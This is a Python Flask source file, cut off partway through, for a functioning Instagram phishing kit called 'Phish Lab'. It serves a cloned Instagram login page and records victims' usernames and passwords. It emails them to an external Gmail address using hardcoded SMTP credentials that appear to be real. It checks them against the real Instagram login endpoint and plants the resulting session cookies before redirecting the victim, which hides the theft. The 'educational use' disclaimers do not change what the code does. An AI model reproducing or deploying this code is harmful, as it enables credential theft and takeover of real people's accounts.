from flask import Flask, request, jsonify, session, redirect, url_for, render_template_string
import sqlite3
import datetime as dt
import os
import time
import requests
import json
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'phish_lab_demo_2025_v2')

# 🔧 CONFIGURATION
DB_FILE = 'pentest_captures.db'
EMAIL_ENABLED = True  # Set to False if you don't want emails

# Email Configuration (USE ENVIRONMENT VARIABLES IN PRODUCTION)
EMAIL_USER = os.getenv('EMAIL_USER', 'pitieem9@gmail.com')  # Change this
EMAIL_PASS = os.getenv('EMAIL_PASS', 'azbs hbwx dxoc jkky')     # Change this
TARGET_EMAIL = os.getenv('TARGET_EMAIL', 'pitieemanzi@gmail.com')  # Where to send captures
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# 🗄️ DATABASE INITIALIZATION
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, username TEXT, password TEXT,
                  ip TEXT, ua TEXT, status TEXT DEFAULT 'checking',
                  cookies TEXT DEFAULT '{}', emailed INTEGER DEFAULT 0,
                  session_ready TEXT DEFAULT 'no')''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings
                 (key TEXT PRIMARY KEY, value TEXT)''')
    
    # Insert default settings if not exists
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('email_enabled', '1')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('email_user', ?)", (EMAIL_USER,))
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_email', ?)", (TARGET_EMAIL,))
    
    conn.commit()
    conn.close()
    print(f"✅ Database initialized: {DB_FILE}")

init_db()

# 📧 EMAIL FUNCTIONALITY
def send_email(subject, body, is_html=False):
    """Send email with capture details"""
    if not EMAIL_ENABLED or not EMAIL_USER or not EMAIL_PASS:
        print("📧 Email disabled or credentials missing")
        return False
    
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = EMAIL_USER
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = subject
        
        if is_html:
            msg.attach(MIMEText(body, 'html'))
        else:
            msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_USER, EMAIL_PASS)
        server.send_message(msg)
        server.quit()
        print(f"📧 Email sent: {subject}")
        return True
    except Exception as e:
        print(f"❌ Email error: {e}")
        return False

def send_capture_email(capture_id, username, password, ip, ua, status="🎣 NEW CAPTURE"):
    """Send email notification about captured credentials"""
    timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    subject = f"🎣 Phish Lab - {status} - #{capture_id}"
    
    # Plain text version
    plain_body = f"""🔥 INSTAGRAM PHISHING CAPTURE

Capture ID: #{capture_id}
Timestamp: {timestamp}
Status: {status}

👤 USERNAME: {username}
🔑 PASSWORD: {password}

🌐 IP Address: {ip}
📱 User Agent: {ua}

📊 View Dashboard: http://127.0.0.1:5000/data_captured
🕵️ Admin Login: http://127.0.0.1:5000/admin (admin/admin123)

--
Sent from Phish Lab Demo
This is for educational purposes only.
"""
    
    # HTML version
    html_body = f"""<!DOCTYPE html>
<html>
<head>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }}
        .header {{ background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888); 
                  color: white; padding: 15px; text-align: center; border-radius: 5px 5px 0 0; }}
        .info {{ background: #f9f9f9; padding: 15px; margin: 10px 0; border-left: 4px solid #0095f6; }}
        .credential {{ background: #fff3cd; padding: 15px; margin: 10px 0; border: 1px solid #ffeaa7; border-radius: 3px; }}
        .footer {{ margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee; color: #666; font-size: 12px; }}
        .status-badge {{ display: inline-block; padding: 3px 8px; background: #dc3545; color: white; border-radius: 3px; font-size: 12px; }}
        .success-badge {{ background: #28a745; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🎣 Phish Lab - Instagram Demo</h2>
            <p>{status}</p>
        </div>
        
        <div class="info">
            <p><strong>Capture ID:</strong> #{capture_id}</p>
            <p><strong>Timestamp:</strong> {timestamp}</p>
            <p><strong>Status:</strong> <span class="status-badge {'success-badge' if 'SUCCESS' in status else ''}">{status}</span></p>
        </div>
        
        <div class="credential">
            <h3>📋 Captured Credentials</h3>
            <p><strong>👤 Username:</strong> {username}</p>
            <p><strong>🔑 Password:</strong> <code>{password}</code></p>
        </div>
        
        <div class="info">
            <h3>🌐 Technical Details</h3>
            <p><strong>IP Address:</strong> {ip}</p>
            <p><strong>User Agent:</strong><br>{ua[:100]}...</p>
        </div>
        
        <div class="info">
            <h3>🔗 Dashboard Links</h3>
            <p><a href="http://127.0.0.1:5000/data_captured">📊 View All Captures</a></p>
            <p><a href="http://127.0.0.1:5000/admin">🕵️ Admin Panel</a> (admin/admin123)</p>
        </div>
        
        <div class="footer">
            <p><strong>⚠️ Educational Use Only</strong></p>
            <p>This system is for cybersecurity education and demonstration only.</p>
            <p>All captured data should be from test/demo accounts with proper authorization.</p>
            <p>Generated by Phish Lab Demo • {timestamp}</p>
        </div>
    </div>
</body>
</html>"""
    
    return send_email(subject, html_body, is_html=True)

# 🤖 INSTAGRAM BOT
def bot_login(username, password):
    """🤖 Fast IG login verification"""
    session = requests.Session()
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        # Get initial page and CSRF token
        r = session.get('https://www.instagram.com/accounts/login/', timeout=10)
        csrf = session.cookies.get('csrftoken', '') or session.cookies.get('csrf_token', '')
        headers['X-CSRFToken'] = csrf
        
        # Prepare encrypted password
        timestamp = str(int(time.time()))
        enc_pass = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
        
        data = {
            'username': username,
            'enc_password': enc_pass,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        # Attempt login
        r = session.post('https://www.instagram.com/accounts/login/ajax/',
                        data=data, headers=headers, timeout=10)
        
        if r.status_code == 200:
            result = r.json()
            success = result.get('authenticated', False)
            
            if success:
                cookies = dict(session.cookies)
                return True, cookies
            else:
                return False, {}
        else:
            return False, {}
            
    except Exception as e:
        print(f"❌ Bot error: {e}")
        return False, {}

# 🔐 ADMIN AUTHENTICATION
def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin')
        return f(*args, **kwargs)
    return decorated_function

# 📱 PHISHING PAGE (Same beautiful frontend)
@app.route('/')
def phish_page():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: rgb(14, 16, 19);
            color: #f6f6f6;
            display: flex;
            flex-direction: column;
            min-height: 80vh;
            line-height: 1.6;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            flex: 1;
        }
        
        /* Language Selector */
        .language-selector {
            display: flex;
            justify-content: flex-end;
            padding: 20px 0;
            font-size: 14px;
        }
        
        .language-selector select {
            background: transparent;
            border: none;
            font-size: 14px;
            color: #b9b9b9;
            outline: none;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        
        .language-selector select:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }
        
        /* Main Content */
        .main-content {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 140px);
            padding: 40px 0;
        }
        
        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            max-width: 350px;
            width: 100%;
        }
        
        /* Instagram Logo */
        @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 72px;
            font-weight: 400;
            margin-bottom: 20px;
            -webkit-background-clip: text;
            background-clip: text;
            color: white;
            letter-spacing: 1px;
        }
        
        /* Login Form */
        .login-form {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 44px 40px 34px;
            width: 100%;
            margin-bottom: 10px;
        }
        
        .login-form h2 {
            font-size: 42px;
            font-weight: 600;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 33px;
            font-family: 'Billabong', cursive;
            font-weight: normal;
            font-size: 60px;
        }
        
        .login-form input {
            width: 95%;
            height: 38px;
            border: 0.5px solid #767676;
            border-radius: 2px;
            background: #313131;
            color: #fbfbfb;
            padding: 9px 0 7px 8px;
            font-size: 14px;
            margin-bottom: 6px;
            box-sizing: border-box;
            outline: none;
        }
        
        .login-form input:focus {
            border-color: #a0a0a0;
            background: #313131;
        }
        
        .login-form .btn {
            width: 100%;
            height: 30px;
            background: #1e74ec;
            color: #fff;
            border: none;
            border-radius: 9px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            margin: 8px 0;
        }
        
        .login-form .btn:hover {
            background: #1877f2;
        }
        
        .login-form .btn:disabled {
            background: #b2b2b2;
            cursor: not-allowed;
        }
        
        #status {
            text-align: center;
            color: #262626;
            font-size: 14px;
            margin-top: 20px;
            min-height: 24px;
            font-weight: normal;
        }
        
        #error {
            color: #ad1f2b;
        }
        
        /* Spinner animation */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 5px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* OR Divider */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 10px 0;
            color: #3d3c3c;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 10px;
        }
        
        /* Facebook Login */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #34a0ff;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin: 10px 0;
        }
        
        .fb-login i {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .fb-login:hover {
            text-decoration: underline;
        }
        
        /* Forgot Password */
        .forgot-password {
            font-size: 14px;
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
            margin-top: 15px;
            display: block;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        /* Signup Prompt */
        .signup-prompt {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 25px 40px;
            width: 100%;
            font-size: 14px;
            color: #f3f3f3;
            text-align: center;
            margin-top: 10px;
        }
        
        .signup-prompt a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-prompt a:hover {
            text-decoration: underline;
        }
        
        /* App Download */
        .app-download {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .field {
          position: relative;
          margin-bottom: 12px;
        }
        
        .field input {
          width: 100%;
          padding: 14px 10px;
          background: #313131;
          border: 1px solid #262626;
          border-radius: 3px;
          color: #fff;
          font-size: 14px;
        }
        
        .field label {
          position: absolute;
          left: 10px;
          top: 50%;
          transform: translateY(-50%);
          color: #8e8e8e;
          font-size: 12px;
          pointer-events: none;
          transition: 0.2s ease;
          background: none;
          padding: 0 4px;
        }
        
        /* float up */
        .field input:focus + label,
        .field input:not(:placeholder-shown) + label {
          top: 6px;
          font-size: 10px;
        }
        
        /* focus border */
        .field input:focus {
          border-color: #555;
          outline: none;
        }
        
        
        .app-download p {
            margin-bottom: 15px;
        }
        
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-badges img {
            height: 40px;
            cursor: pointer;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px 0;
            color: #b9b9b9;
            font-size: 12px;
            margin-top: 40px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px 10px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Phone Preview (Right Side) */
        .phone-preview {
            display: none;
        }
        
        /* For larger screens, show the phone preview */
        @media (min-width: 876px) {
            .main-content {
                justify-content: space-between;
            }
            
            .content-wrapper {
                margin-right: 50px;
            }
            
            .phone-preview {
                display: block;
                background-image: url('https://i.imgur.com/vx9VWqk.png');
                background-size: contain;
                background-repeat: no-repeat;
                background-position: center;
                width: 380px;
                height: 580px;
                position: relative;
            }
            
            .phone-preview::before {
                content: '';
                position: absolute;
                top: 25px;
                left: 112px;
                width: 250px;
                height: 445px;
                background-image: url('https://i.imgur.com/Lu1B7Qq.jpg');
                background-size: cover;
                background-position: center;
                border-radius: 22px;
            }
        }
        
        /* Custom Font for Instagram Logo */
        @font-face {
            font-family: 'Billabong';
            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
        }
        
        /* Mobile Responsiveness */
        @media (max-width: 768px) {
            .instagram-logo {
                font-size: 60px;
            }
            
            .tagline {
                font-size: 20px;
                padding: 0 10px;
            }
            
            .language-selector {
                justify-content: center;
                padding: 15px 0;
            }
            
            .phone-preview {
                display: none;
            }
        }
        
        @media (max-width: 450px) {
            .instagram-logo {
                font-size: 52px;
            }
            
            .tagline {
                font-size: 18px;
            }
            
            .login-form {
                padding: 30px 20px;
                background: transparent;
                border: none;
            }
            
            .signup-prompt {
                background: transparent;
                border: none;
            }
            
            .content-wrapper {
                padding: 0 15px;
            }
            
            .container {
                padding: 0;
            }
            
            .language-selector {
                padding: 10px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- Main Content -->
        <div class="main-content">
            <div class="content-wrapper">
                <!-- Instagram Logo (outside form) -->
                <h1 class="instagram-logo">Instagram</h1>
                                
                <!-- Login Form -->
                <div class="login-form">
                    
                    <form id="login">
                      <div class="field">
                        <input name="username" required placeholder=" " />
                        <label>Phone number, username, or email</label>
                      </div>
                    
                      <div class="field">
                        <input name="password" type="password" required placeholder=" " />
                        <label>Password</label>
                      </div>
                    
                      <button type="submit" class="btn">Log in</button>
                    </form>
                    
                    <!-- OR Divider -->
                    <div class="divider">
                        <span>OR</span>
                    </div>
                    
                    <!-- Facebook Login -->
                    <a href="#" class="fb-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    
                    <!-- Forgot Password -->
                    <a href="#" class="forgot-password">Forgot password?</a>
                    
                    <!-- Status Message -->
                    <div id="status"></div>
                </div>
                
                <!-- Sign Up Prompt -->
                <div class="signup-prompt">
                    Don't have an account? <a href="#" id="signup-link">Sign up</a>
                </div>
                
                <!-- App Download -->
                <div class="app-download">
                    <p>Get the app.</p>
                    <div class="app-badges">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" onclick="alert('App Store link would open here')">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" onclick="alert('Google Play link would open here')">
                    </div>
                </div>
            </div>
            
            <!-- Phone Preview (visible on desktop) -->
            <div class="phone-preview"></div>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="https://about.meta.com">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <!-- Language Selector -->
        <div class="language-selector">
            <select id="language-select">
                <option value="en" selected>English</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
                <option value="pt">Português</option>
            </select>
        </div>
        <div class="copyright">
            &copy; 2026 Instagram from Meta
        </div>
    </div>

    <!-- Replace the entire script section in your index.html with this: -->
<script>
    let checkInterval;

    document.getElementById('login').onsubmit = async (e) => {
        e.preventDefault();
        
        const form = e.target;
        const btn = form.querySelector('button[type="submit"]');
        const status = document.getElementById('status');
        const usernameInput = form.querySelector('input[name="username"]');
        const passwordInput = form.querySelector('input[name="password"]');
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Validation
        if (!username || !password) {
            status.innerHTML = '<span style="color:#ed4956;font-size:14px;">Please enter both username and password</span>';
            return;
        }
        
        // Disable form and show loading
        btn.disabled = true;
        const originalBtnText = btn.textContent;
        btn.innerHTML = 'Verifying <span class="spinner"></span>';
        
        // Clear any previous status and show loading
        status.innerHTML = '<span style="color:#0095f6;font-size:14px;">⏳ Sending credentials to Instagram...</span>';
        
        try {
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            
            const response = await fetch('/capture', {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.wait_id) {
                status.innerHTML = '<span style="color:#0095f6;font-size:14px;">🔍 Verifying with Instagram servers...</span>';
                
                // Poll for status updates
                let attempts = 0;
                const maxAttempts = 40; // ~30 seconds total (40 * 750ms)
                
                checkInterval = setInterval(async () => {
                    attempts++;
                    
                    try {
                        const checkResponse = await fetch(`/status/${data.wait_id}`);
                        const checkData = await checkResponse.json();
                        
                        if (checkData.ready) {
                            clearInterval(checkInterval);
                            btn.disabled = false;
                            btn.innerHTML = originalBtnText;
                            
                            if (checkData.success) {
                                status.innerHTML = '<span style="color:#0f0;font-size:14px;">✅ Success! Loading your account...</span>';
                                // Redirect to the home endpoint
                                setTimeout(() => {
                                    window.location.href = `/home/${data.wait_id}`;
                                }, 1500);
                            } else {
                                status.innerHTML = '<span style="color:#ed4956;font-size:14px;">❌ Sorry, your password was incorrect. Please double-check your password.</span>';
                                // Clear password field and focus on it
                                passwordInput.value = '';
                                passwordInput.focus();
                                // Update placeholder styling
                                passwordInput.dispatchEvent(new Event('input', { bubbles: true }));
                            }
                        } else if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            btn.disabled = false;
                            btn.innerHTML = originalBtnText;
                            status.innerHTML = '<span style="color:#ff9900;font-size:14px;">⚠️ Verification taking longer than expected. Please try again.</span>';
                        }
                    } catch (err) {
                        console.error('Status check error:', err);
                    }
                }, 750); // Check every 750ms
                
            } else {
                throw new Error('Invalid response from server');
            }
        } catch (error) {
            console.error('Submission error:', error);
            btn.disabled = false;
            btn.innerHTML = originalBtnText;
            status.innerHTML = '<span style="color:#ed4956;font-size:14px;">❌ Connection error. Please check your internet and try again.</span>';
        }
    };
    
    // Form field interaction enhancements
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('login');
        const fields = form.querySelectorAll('.field input');
        const labels = form.querySelectorAll('.field label');
        
        // Initialize labels based on existing values
        fields.forEach((field, index) => {
            if (field.value) {
                labels[index].style.top = '6px';
                labels[index].style.fontSize = '10px';
            }
            
            // Handle focus
            field.addEventListener('focus', function() {
                this.parentElement.querySelector('label').style.top = '6px';
                this.parentElement.querySelector('label').style.fontSize = '10px';
                this.style.borderColor = '#555';
            });
            
            // Handle blur
            field.addEventListener('blur', function() {
                if (!this.value) {
                    this.parentElement.querySelector('label').style.top = '50%';
                    this.parentElement.querySelector('label').style.fontSize = '12px';
                }
                this.style.borderColor = '#262626';
            });
            
            // Handle input for real-time validation
            field.addEventListener('input', function() {
                if (this.value) {
                    this.parentElement.querySelector('label').style.top = '6px';
                    this.parentElement.querySelector('label').style.fontSize = '10px';
                }
            });
        });
        
        // Clear status when user starts typing again
        fields.forEach(field => {
            field.addEventListener('input', () => {
                const status = document.getElementById('status');
                if (status.innerHTML.includes('error') || status.innerHTML.includes('✅') || status.innerHTML.includes('⚠️')) {
                    status.innerHTML = '';
                }
            });
        });
        
        // Animate the main content on load
        const mainContent = document.querySelector('.content-wrapper');
        mainContent.style.opacity = '0';
        mainContent.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            mainContent.style.transition = 'opacity 0.8s, transform 0.8s';
            mainContent.style.opacity = '1';
            mainContent.style.transform = 'translateY(0)';
        }, 300);
        
        // Animate the phone preview on desktop
        const phonePreview = document.querySelector('.phone-preview');
        if (phonePreview) {
            phonePreview.style.opacity = '0';
            setTimeout(() => {
                phonePreview.style.transition = 'opacity 1.2s';
                phonePreview.style.opacity = '1';
            }, 500);
        }
        
        // Clear any existing interval when page is unloading
        window.addEventListener('beforeunload', function() {
            if (checkInterval) {
                clearInterval(checkInterval);
            }
        });
    });
    
    // Signup link functionality
    document.getElementById('signup-link').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Sign up would be implemented here. In a real app, this would redirect to a signup page.');
    });
    
    // Facebook login functionality
    document.querySelector('.fb-login').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Facebook login would be implemented here. This is just a visual clone.');
    });
    
    // Forgot password functionality
    document.querySelector('.forgot-password').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Password recovery would be implemented here. This is just a visual clone.');
    });
    
    // Language selector functionality
    document.getElementById('language-select').addEventListener('change', function() {
        const selectedLanguage = this.value;
        console.log('Language changed to:', this.options[this.selectedIndex].text);
        
        // Show a simple alert for demonstration
        if (selectedLanguage !== 'en') {
            alert(`Language changed to ${this.options[this.selectedIndex].text}. In a real app, the page content would be translated.`);
        }
    });
</script>
</body>
</html>'''

# 🎣 CAPTURE ENDPOINT
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')[:250]
    
    if not username or not password:
        return jsonify({'error': 'Missing credentials'}), 400
    
    # Save to database
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    timestamp = dt.datetime.now().isoformat()
    c.execute('''INSERT INTO captures (timestamp, username, password, ip, ua) 
                 VALUES (?, ?, ?, ?, ?)''', 
              (timestamp, username, password, ip, ua))
    capture_id = c.lastrowid
    conn.commit()
    conn.close()
    
    print(f"\n🎣 CAPTURE #{capture_id}: {username} | {password}")
    print(f"🌐 IP: {ip}")
    
    # Send initial email notification
    if EMAIL_ENABLED:
        threading.Thread(
            target=send_capture_email,
            args=(capture_id, username, password, ip, ua, "🎣 NEW CAPTURE"),
            daemon=True
        ).start()
    
    # Start verification in background thread
    def verify_credentials():
        try:
            success, cookies = bot_login(username, password)
            status = '✅ SUCCESS' if success else '❌ FAILED'
            cookies_json = json.dumps(cookies) if success else '{}'
            session_ready = 'yes' if success else 'no'
            
            # Update database
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute('''UPDATE captures 
                        SET status=?, cookies=?, session_ready=?, emailed=1 
                        WHERE id=?''',
                     (status, cookies_json, session_ready, capture_id))
            conn.commit()
            conn.close()
            
            print(f"🤖 VERIFICATION #{capture_id}: {status}")
            
            # Send result email
            if EMAIL_ENABLED:
                send_capture_email(
                    capture_id, username, password, ip, ua, 
                    f"{status} - {'VALID CREDENTIALS' if success else 'INVALID CREDENTIALS'}"
                )
                
        except Exception as e:
            print(f"❌ Verification error #{capture_id}: {e}")
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE captures SET status='❌ ERROR' WHERE id=?", (capture_id,))
            conn.commit()
            conn.close()
    
    threading.Thread(target=verify_credentials, daemon=True).start()
    
    return jsonify({'wait_id': capture_id})

# 📊 STATUS CHECK
@app.route('/status/<int:capture_id>')
def status_check(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT status FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'ready': False, 'error': 'Not found'})
    
    status = row[0]
    ready = status != 'checking' and status is not None
    
    return jsonify({
        'ready': ready,
        'success': '✅ SUCCESS' in status if ready else False,
        'status': status
    })

# 🌐 REDIRECT TO REAL INSTAGRAM (Only for valid credentials)
@app.route('/home/<int:capture_id>')
def real_home(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT cookies, username, status FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if row and row[0] and row[2] == '✅ SUCCESS':
        cookies = json.loads(row[0])
        username = row[1]
        
        # Build cookie script
        cookie_script = ""
        for key, value in cookies.items():
            cookie_script += f'document.cookie = "{key}={value}; domain=.instagram.com; path=/";\n'
        
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to Instagram...</title>
    <style>
        body {{
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            text-align: center;
            padding: 100px 20px;
        }}
        .container {{
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h2 {{
            color: #0095f6;
            margin-bottom: 20px;
        }}
        .spinner {{
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>✅ Welcome back, {username}!</h2>
        <p>Your Instagram session is being restored...</p>
        <div class="spinner"></div>
        <p style="color: #666; font-size: 14px; margin-top: 20px;">
            Redirecting to instagram.com
        </p>
    </div>
    
    <script>
        // Set Instagram cookies
        {cookie_script}
        
        // Redirect after 1.5 seconds
        setTimeout(() => {{
            window.location.href = "https://www.instagram.com/";
        }}, 1500);
    </script>
</body>
</html>'''
    else:
        # Invalid or not ready - redirect back to fake login
        return redirect('/')

# 🔐 ADMIN PANEL
@app.route('/admin')
def admin_login():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🔐 Admin Login</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 350px;
        }
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #1877f2;
        }
        .error {
            color: #ed4956;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔐 Phish Lab Admin</h2>
        <form method="POST" action="/admin/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 14px;">
            Default: admin / admin123
        </div>
    </div>
</body>
</html>'''

@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if username == 'admin' and password == 'admin123':
        session['admin_logged_in'] = True
        return redirect('/data_captured')
    
    return '''
    <script>
        alert("Invalid credentials!");
        window.location.href = "/admin";
    </script>'''

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/admin')

# 📊 DASHBOARD
@app.route('/data_captured')
@require_admin
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Get total stats
    c.execute("SELECT COUNT(*), COUNT(CASE WHEN status='✅ SUCCESS' THEN 1 END) FROM captures")
    total, valid = c.fetchone()
    
    # Get recent captures
    c.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 50")
    rows = c.fetchall()
    conn.close()
    
    # Build table rows
    rows_html = ''
    for row in rows:
        status = row[6] or 'checking'
        status_class = 'success' if '✅ SUCCESS' in status else 'failed' if '❌ FAILED' in status else 'checking'
        emailed = '📧' if row[8] else '📪'
        
        rows_html += f'''
        <tr>
            <td>{row[0]}</td>
            <td>{row[1][:19]}</td>
            <td>{row[2]}</td>
            <td><code>{row[3]}</code></td>
            <td>{row[4]}</td>
            <td class="{status_class}">{status}</td>
            <td>{emailed}</td>
            <td>{'✅' if row[9]=='yes' else '❌'}</td>
        </tr>'''
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>📊 Phish Lab Dashboard</title>
    <style>
        body {{
